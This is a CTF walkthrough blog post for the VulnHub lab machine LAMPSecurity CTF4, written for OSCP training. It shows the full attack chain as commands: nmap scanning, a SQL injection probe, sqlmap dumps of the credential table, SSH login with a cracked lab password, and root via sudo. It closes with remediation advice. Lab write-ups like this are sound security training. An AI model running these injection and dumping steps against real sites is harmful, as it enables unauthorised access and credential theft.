---
layout: post
title: "LAMPSecurity CTF4 Walkthrough (OSCP Style)"
date: 2026-03-20
categories: [CTF, VulnHub, OSCP]
tags: [sql-injection, privilege-escalation, writeup]
---

# LAMPSecurity CTF4 (VulnHub)

## Executive Summary
This machine was compromised through a SQL Injection vulnerability, leading to credential extraction, SSH access, and privilege escalation via misconfigured sudo permissions.

---

## Target Information
- **IP Address:** 192.168.1.103
- **Environment:** Local Lab
- **Access Level:** Black Box

---

## Reconnaissance

### Network Discovery
```bash
netdiscover
```

Identified target:
```
192.168.1.103
```

---

### Port Scanning
```bash
nmap -A 192.168.1.103
```

**Open Ports:**
- 22 (SSH)
- 25 (SMTP)
- 80 (HTTP)

---

## Enumeration

### Web Enumeration
Visited:
```
http://192.168.1.103
```

Found blog parameter:
```
id=2
```

### SQL Injection Test
```
id=2'
```

Result: SQL error → injectable parameter

---

## Exploitation

### SQL Injection (SQLMap)
```bash
sqlmap -u "http://192.168.1.103/index.html?page=blog&title=Blog&id=2" --dbs --batch
```

Database discovered:
```
ehks
```

### Dump Tables
```bash
sqlmap -u "http://192.168.1.103/index.html?page=blog&title=Blog&id=2" -D ehks --tables --batch
```

### Dump Credentials
```bash
sqlmap -u "http://192.168.1.103/index.html?page=blog&title=Blog&id=2" -D ehks -T user --dump
```

---

## Post-Exploitation

### Password Cracking
Recovered:
```
dstevens : ilike2surf
```

---

### SSH Access
```bash
ssh dstevens@192.168.1.103
```

---

## Privilege Escalation

### Check Sudo
```bash
sudo -l
```

Output:
```
User may run ALL commands
```

### Exploit
```bash
sudo su
```

---

## Proof of Compromise
```bash
whoami
```

Output:
```
root
```

---

## Vulnerabilities

### 1. SQL Injection
- Unsanitized input allowed DB access

### 2. Weak Hashing (MD5)
- Easily cracked passwords

### 3. Credential Reuse
- Same credentials for DB and SSH

### 4. Misconfigured Sudo
- Full root access via sudo

---

## Attack Chain
1. SQL Injection  
2. Credential Dump  
3. SSH Login  
4. Privilege Escalation  

---

## Recommendations

- Use prepared statements
- Replace MD5 with bcrypt/argon2
- Enforce least privilege
- Avoid credential reuse

---

## Final Thoughts
This box demonstrates a classic real-world attack chain combining web exploitation and privilege escalation.
